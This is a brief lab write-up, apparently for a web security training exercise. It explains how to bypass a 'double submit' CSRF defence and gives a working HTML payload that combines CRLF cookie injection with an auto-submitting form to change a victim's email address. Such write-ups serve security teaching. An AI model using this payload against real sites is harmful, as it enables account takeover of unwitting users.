

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`


---------------------


The server doesn’t store CSRF tokens server-side. It just checks if the csrf cookie matches the csrf form parameter. Since there’s no server-side record, you can invent any value — as long as the cookie and form body match, the server accepts it.

Use CRLF injection (or any cookie-setting behavior) to inject a made-up csrf cookie into the victim’s browser, then submit the form with the same made-up value.

```
<img src="https://TARGET/?search=test%0d%0aSet-Cookie:csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()" />
<form action="https://TARGET/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net" />
  <input type="hidden" name="csrf" value="fake" />
</form>
```


The flaw is that the server trusts the client to validate itself. No server-side state means no real verification — just a string comparison between two values the attacker controls.